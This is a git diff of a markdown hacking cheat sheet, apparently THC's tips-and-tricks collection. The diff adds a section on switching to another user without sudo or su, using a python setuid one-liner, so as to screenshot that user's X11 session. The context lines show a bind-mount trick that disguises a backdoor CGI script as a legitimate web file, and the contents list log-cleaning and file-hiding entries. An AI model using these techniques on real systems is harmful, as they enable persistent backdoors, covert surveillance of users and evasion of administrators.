@@ -81,6 +81,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
    1. [Make a file immutable](#perm-files)
+   1. [Change user without sudo/su]
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
@@ -1709,6 +1710,16 @@ This will redirect `/var/www/cgi/blah.cgi` to `/boot/backdoor.cgi`. The file `bl
 # /boot/backdoor.cgi contains our backdoor
 touch /var/www/cgi/blah.cgi
 mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
+```
+
+**8.vi. Change user without sudo/su**
+
+Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | convert - jpg:screenshot.jpg`)
+```bash
+U=$(id -u UserName) ### <-- Set UserName
+H="$(grep "$U" /etc/passwd | cut -d: -f6)"
+HOME="${H:-/tmp}" python3 -c "import os;os.setuid(${U:?});os.execl('/bin/bash', '-bash')"
+# change -bash to bash to not make this a login shell.
 ```
 
 ---
